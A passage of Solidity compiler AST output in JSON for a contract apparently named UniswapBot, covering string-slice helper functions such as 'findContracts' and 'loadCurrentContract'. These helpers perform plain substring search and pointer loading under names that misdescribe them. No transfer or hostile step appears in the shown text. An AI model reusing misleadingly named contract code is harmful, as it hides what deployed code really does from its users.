																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "3042:1:9",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 799,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 797,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "3047:2:9",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 798,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 771,
																																"src": "3052:9:9",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "3047:14:9",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 800,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "3046:16:9",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "3042:20:9",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 802,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "3041:22:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "3036:27:9",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 804,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "3066:1:9",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "3036:31:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 806,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "3035:33:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 794,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "3026:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 793,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3026:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 808,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "3026:43:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3011:58:9"
																	},
																	{
																		"assignments": [
																			811
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 811,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 845,
																				"src": "3091:18:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 810,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3091:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 812,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3091:18:9"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3137:45:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3139:41:9",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "3163:9:9"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3157:5:9"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3157:16:9"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3175:4:9"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3153:3:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3153:27:9"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "3139:10:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 792,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3175:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 811,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3139:10:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 773,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3163:9:9",
																				"valueSize": 1
																			}
																		],
																		"id": 813,
																		"nodeType": "InlineAssembly",
																		"src": "3128:54:9"
																	},
																	{
																		"assignments": [
																			815
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 815,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 845,
																				"src": "3203:8:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 814,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "3203:4:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 821,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 820,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 818,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 816,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 769,
																					"src": "3214:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 817,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 767,
																					"src": "3224:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3214:17:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 819,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 771,
																				"src": "3234:9:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3214:29:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3203:40:9"
																	},
																	{
																		"assignments": [
																			823
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 823,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 845,
																				"src": "3262:15:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 822,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3262:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 824,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3262:15:9"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3305:36:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3307:32:9",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "3328:3:9"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3322:5:9"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3322:10:9"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3334:4:9"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3318:3:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3318:21:9"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "3307:7:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 792,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3334:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 779,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3328:3:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 823,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3307:7:9",
																				"valueSize": 1
																			}
																		],
																		"id": 825,
																		"nodeType": "InlineAssembly",
																		"src": "3296:45:9"
																	},
																	{
																		"body": {
																			"id": 841,
																			"nodeType": "Block",
																			"src": "3392:203:9",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 831,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 829,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 779,
																							"src": "3419:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 830,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 815,
																							"src": "3426:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3419:10:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 836,
																					"nodeType": "IfStatement",
																					"src": "3415:65:9",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 834,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 832,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 769,
																								"src": "3463:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 833,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 767,
																								"src": "3473:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3463:17:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 777,
																						"id": 835,
																						"nodeType": "Return",
																						"src": "3456:24:9"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 838,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3503:5:9",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 837,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 779,
																							"src": "3503:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 839,
																					"nodeType": "ExpressionStatement",
																					"src": "3503:5:9"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3540:36:9",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3542:32:9",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3563:3:9"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3557:5:9"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3557:10:9"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3569:4:9"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3553:3:9"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3553:21:9"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3542:7:9"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 792,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3569:4:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 779,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3563:3:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 823,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3542:7:9",
																							"valueSize": 1
																						}
																					],
																					"id": 840,
																					"nodeType": "InlineAssembly",
																					"src": "3531:45:9"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 828,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 826,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 823,
																				"src": "3369:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 827,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 811,
																				"src": "3380:10:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3369:21:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 842,
																		"nodeType": "WhileStatement",
																		"src": "3362:233:9"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 843,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 779,
																			"src": "3620:3:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 777,
																		"id": 844,
																		"nodeType": "Return",
																		"src": "3613:10:9"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 884,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 882,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 769,
														"src": "4152:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 883,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 767,
														"src": "4162:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4152:17:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 777,
												"id": 885,
												"nodeType": "Return",
												"src": "4145:24:9"
											}
										]
									},
									"documentation": null,
									"id": 887,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 774,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 767,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 887,
												"src": "2780:12:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 766,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2780:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 769,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 887,
												"src": "2794:12:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 768,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2794:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 771,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 887,
												"src": "2808:14:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 770,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2808:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 773,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 887,
												"src": "2824:14:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 772,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2824:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2779:60:9"
									},
									"returnParameters": {
										"id": 777,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 776,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 887,
												"src": "2862:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 775,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2862:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2861:6:9"
									},
									"scope": 2159,
									"src": "2757:1420:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 904,
										"nodeType": "Block",
										"src": "4403:134:9",
										"statements": [
											{
												"assignments": [
													895
												],
												"declarations": [
													{
														"constant": false,
														"id": 895,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "4414:17:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 894,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4414:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 897,
												"initialValue": {
													"argumentTypes": null,
													"id": 896,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 889,
													"src": "4434:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4414:24:9"
											},
											{
												"assignments": [
													899
												],
												"declarations": [
													{
														"constant": false,
														"id": 899,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "4449:11:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 898,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4449:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 900,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4449:11:9"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4480:26:9",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4482:22:9",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4496:3:9"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4501:2:9",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4492:3:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "4492:12:9"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4482:6:9"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 895,
														"isOffset": false,
														"isSlot": false,
														"src": "4496:3:9",
														"valueSize": 1
													},
													{
														"declaration": 899,
														"isOffset": false,
														"isSlot": false,
														"src": "4482:6:9",
														"valueSize": 1
													}
												],
												"id": 901,
												"nodeType": "InlineAssembly",
												"src": "4471:35:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 902,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 895,
													"src": "4526:3:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 893,
												"id": 903,
												"nodeType": "Return",
												"src": "4519:10:9"
											}
										]
									},
									"documentation": null,
									"id": 905,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 890,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 889,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "4345:18:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 888,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4345:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4344:20:9"
									},
									"returnParameters": {
										"id": 893,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 892,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "4388:13:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 891,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4388:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4387:15:9"
									},
									"scope": 2159,
									"src": "4316:221:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1022,
										"nodeType": "Block",
										"src": "4838:823:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 919,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 914,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 909,
															"src": "4849:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 916,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "4849:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 917,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "4861:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 918,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "4861:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4849:21:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 920,
												"nodeType": "ExpressionStatement",
												"src": "4849:21:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 924,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 921,
															"name": "self",
